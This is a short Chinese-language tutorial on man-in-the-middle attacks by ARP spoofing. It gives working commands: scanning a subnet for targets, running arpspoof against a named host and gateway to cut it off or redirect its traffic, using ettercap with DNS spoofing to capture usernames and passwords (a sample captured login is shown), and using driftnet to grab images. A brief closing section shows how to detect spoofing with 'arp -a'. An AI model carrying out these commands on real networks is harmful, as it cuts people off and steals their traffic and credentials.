# 中间人攻击之ARP欺骗

### 让局域网同网段下的其它机器断网

```shell
sudo apt-get install dsniff

# 找到目标靶机
sudo nbtscan -r 172.16.20.0/24

# 开启ARP欺骗，目标机器开启防火墙的情况下也可以操作
# arpspoof 工具将向网络中发送伪造的 ARP 回复，将目标IP 地址的 MAC 地址更改为虚假的 MAC 地址，从而使流量被导向攻击者控制的设备。
# arpspoof -i 网卡 -t 目标IP 网关
sudo arpspoof -i eth0 -t 172.16.20.40 172.16.20.254

# 开启ip转发（1:正常上网 0:断网）
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### 流量嗅探 -- 监控网络

```shell
sudo apt-get install driftnet

# -T：仅使用文本GUI
# -q：不显示详细数据内容，只显示用户名密码等
# -i：指定网卡
ettercap -Tq -i eth0
# 指定攻击人  -M arp:remote -P dns_spoof /被攻击者ip// /被攻击者网关//
ettercap -Tq -i eth0 -M arp:remote -P dns_spoof /172.16.20.40// /172.16.20.254//
# 不是所有网站的账号密码都能监听识别出来哈，有条件限制
# HTTP : 19.88.55.158:80 -> USER: admin  PASS: 123456test  INFO: http://www.zhengqingya.com/login CONTENT: username=admin&pwd=123456test

# 图片嗅探 -- 监听目标机器访问http协议的图片
# 将嗅探到的图片保存到`/tmp/test`目录下
# tips： 个人测试后无效...
driftnet -i eth0 -a -d /tmp/test
```

### 查看是否存在ARP病毒

windows目标机上查看是否存在多个相同物理地址，如果有多个相同的即说明ARP欺骗

```shell
C:\Users\zhengqingya>arp -a

接口: 172.16.20.40 --- 0x16
  Internet 地址         物理地址              类型
  172.16.20.1           00-90-28-01-08-ef     动态
  172.16.20.97          28-16-ad-eb-91-b9     动态
  172.16.20.99          00-15-5d-02-09-03     动态
  172.16.20.103         d8-bb-c1-55-13-b0     动态
  172.16.20.130         00-15-5d-02-09-03     动态
  172.16.20.148         40-b0-76-7c-79-ab     动态
  172.16.20.254         00-15-5d-02-09-03     动态
  172.16.20.255         ff-ff-ff-ff-ff-ff     静态
```

